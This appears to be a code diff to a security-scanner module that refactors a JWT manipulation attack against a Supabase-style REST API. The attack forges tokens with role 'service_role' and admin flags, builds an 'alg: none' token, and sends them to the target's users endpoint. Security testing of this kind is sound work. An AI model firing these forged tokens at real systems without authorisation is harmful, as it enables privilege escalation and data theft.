@@ -4,6 +4,7 @@
  */
 
 import type { AttackVector, AttackContext, AttackResult } from '$lib/types/attacks';
+import { parseJWT } from '$lib/utils/jwt';
 
 export const authEdgeCasesAttacks: AttackVector[] = [
 	{
@@ -524,35 +525,35 @@ export const authEdgeCasesAttacks: AttackVector[] = [
 			let breached = false;
 
 			// Decode and analyze the anon key (it's a JWT)
-			try {
-				const parts = ctx.anonKey.split('.');
-				if (parts.length === 3) {
-					const header = JSON.parse(atob(parts[0]));
-					const payload = JSON.parse(atob(parts[1]));
+			const parts = ctx.anonKey.split('.');
+			const jwt = parseJWT(ctx.anonKey);
+			if (jwt) {
+				const { header, payload } = jwt;
 
-					// Check algorithm
-					if (header.alg === 'none') {
-						findings.push('CRITICAL: JWT uses "none" algorithm - forgery trivial!');
-						breached = true;
-					} else if (header.alg === 'HS256') {
-						// Test if we can use the key as the secret (common mistake)
-						findings.push('JWT uses HS256 - verify secret is not predictable');
-					}
+				// Check algorithm
+				if (header.alg === 'none') {
+					findings.push('CRITICAL: JWT uses "none" algorithm - forgery trivial!');
+					breached = true;
+				} else if (header.alg === 'HS256') {
+					// Test if we can use the key as the secret (common mistake)
+					findings.push('JWT uses HS256 - verify secret is not predictable');
+				}
 
-					// Create a manipulated token with elevated role
-					const manipulatedPayload = {
-						...payload,
-						role: 'service_role',
-						is_super_admin: true
-					};
+				// Create a manipulated token with elevated role
+				const manipulatedPayload = {
+					...payload,
+					role: 'service_role',
+					is_super_admin: true
+				};
 
-					const manipulatedToken = [
-						parts[0],
-						btoa(JSON.stringify(manipulatedPayload)),
-						parts[2]
-					].join('.');
+				const manipulatedToken = [
+					parts[0],
+					btoa(JSON.stringify(manipulatedPayload)),
+					parts[2]
+				].join('.');
 
-					// Test if manipulated token is accepted
+				// Test if manipulated token is accepted
+				try {
 					const testRes = await fetch(`${ctx.targetUrl}/rest/v1/users?select=*&limit=1`, {
 						headers: {
 							'apikey': ctx.anonKey,
@@ -569,14 +570,16 @@ export const authEdgeCasesAttacks: AttackVector[] = [
 							breached = true;
 						}
 					}
+				} catch {}
 
-					// Test "alg: none" attack
-					const noneToken = [
-						btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })),
-						btoa(JSON.stringify({ ...payload, role: 'service_role' })),
-						''
-					].join('.');
+				// Test "alg: none" attack
+				const noneToken = [
+					btoa(JSON.stringify({ alg: 'none', typ: 'JWT' })),
+					btoa(JSON.stringify({ ...payload, role: 'service_role' })),
+					''
+				].join('.');
 
+				try {
 					const noneRes = await fetch(`${ctx.targetUrl}/rest/v1/users?select=*&limit=1`, {
 						headers: {
 							'apikey': ctx.anonKey,
@@ -593,8 +596,8 @@ export const authEdgeCasesAttacks: AttackVector[] = [
 							breached = true;
 						}
 					}
-				}
-			} catch {}
+				} catch {}
+			}
 
 			return {
 				attackId: 'auth-jwt-manipulation',
